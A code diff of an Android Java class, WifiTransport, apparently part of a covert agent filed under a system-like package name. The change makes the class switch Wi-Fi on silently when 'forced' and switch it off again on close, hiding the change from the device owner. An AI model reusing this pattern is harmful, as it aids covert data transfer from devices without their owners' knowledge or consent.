@@ -14,15 +14,21 @@ import android.net.wifi.WifiManager;
 
 import com.android.service.Device;
 import com.android.service.Status;
+import com.android.service.auto.Cfg;
+import com.android.service.util.Check;
 
 /**
  * The Class WifiTransport.
  */
 public class WifiTransport extends HttpKeepAliveTransport {
-
+	private static final String TAG = "WifiTransport";
 	/** The forced. */
 	private boolean forced;
+	private boolean switchedOn;
 
+	final String service = Context.WIFI_SERVICE;
+	final WifiManager wifi = (WifiManager) Status.getAppContext().getSystemService(service);
+	
 	/**
 	 * Instantiates a new wifi transport.
 	 * 
@@ -53,25 +59,33 @@ public class WifiTransport extends HttpKeepAliveTransport {
 	 */
 	@Override
 	public boolean isAvailable() {
-		final String service = Context.WIFI_SERVICE;
-		final WifiManager wifi = (WifiManager) Status.getAppContext()
-				.getSystemService(service);
+		
 
 		boolean available = wifi.isWifiEnabled();
 		if (!wifi.isWifiEnabled()) {
 			if (forced && wifi.getWifiState() != WifiManager.WIFI_STATE_ENABLING) {
+				if (Cfg.DEBUG)
+					Check.log(TAG + " try to enable wifi");
 				available = wifi.setWifiEnabled(true);
+				switchedOn=available;
 			}
 		}
-		
-		// TODO: togliere
-		if(Device.self().isSimulator()){
+
+		if (Device.self().isSimulator()) {
 			return true;
 		}
 
 		return available;
 	}
-
-
+	
+	@Override
+	public void close() {
+		super.close();
+		if(switchedOn){
+			final WifiManager wifi = (WifiManager) Status.getAppContext().getSystemService(service);
+			wifi.setWifiEnabled(false);
+			switchedOn=false;
+		}
+	}
 
 }
